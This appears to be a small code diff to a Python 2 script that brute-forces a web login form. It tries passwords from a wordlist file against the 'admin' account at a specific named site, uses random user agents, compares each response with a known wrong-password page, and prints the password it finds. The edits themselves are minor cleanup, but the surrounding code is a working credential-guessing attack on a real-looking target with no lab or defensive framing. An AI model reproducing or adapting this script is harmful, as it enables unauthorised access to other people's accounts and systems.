@@ -26,7 +26,7 @@ def test_wrong(url, testacc="á/ü", testpass="1á"):
     
     br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
     
-    response = br.open(url)
+    br.open(url)
     
     for form in br.forms():
         print "Form name:", form.name
@@ -68,7 +68,7 @@ def brute_force(url, acc, pwd, wrong_page):
     
     br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
     
-    response = br.open(url)
+    br.open(url)
     
     br.select_form(nr=0)
     
@@ -83,13 +83,14 @@ def brute_force(url, acc, pwd, wrong_page):
         return pwd
 
     
-    # ##
+    ####
 if __name__ == '__main__':
     f = open("text-files/passwords.txt").read().split("\n")
     wrong_page = test_wrong("http://evsum.com/bcmunka")
     for pwd in f:
         if brute_force("http://evsum.com/bcmunka", "admin", pwd, wrong_page) == False:
             print "Wrong: " + pwd
+            pass
         else:
             print "Found the password: " + pwd
             break
